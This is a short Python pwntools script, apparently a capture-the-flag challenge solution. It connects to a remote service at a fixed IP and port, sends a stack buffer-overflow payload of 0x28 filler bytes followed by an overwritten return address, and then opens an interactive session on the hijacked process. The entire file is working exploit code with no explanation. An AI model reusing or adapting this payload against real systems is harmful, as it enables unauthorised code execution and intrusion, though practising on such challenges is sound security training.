#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# Author : yuan
# https://30cm.ml

host = "140.115.59.7"
port = 11001

yuan = remote(host,port)

# int --> 4 bytes char ----> 1 bytes
# getline has '\0' in the end of the input string

ad = "00"
pool = [102,102,102,102,102,102,102,102,7,134]
overflow = 'f'*0x28+"\x8d\x06\x40\x00" + "\x00\x00\x00"+chr(int(ad,10))  #+ a.encode("byte")
#yuan.recvuntil("?")
#yuan.sendline("2147483647") 
#yuan.recvuntil("?")
yuan.sendline(overflow)
#yuan.recvuntil(".")
#str = yuan.recvall()
#print(str)
yuan.interactive()
#yuan.close()
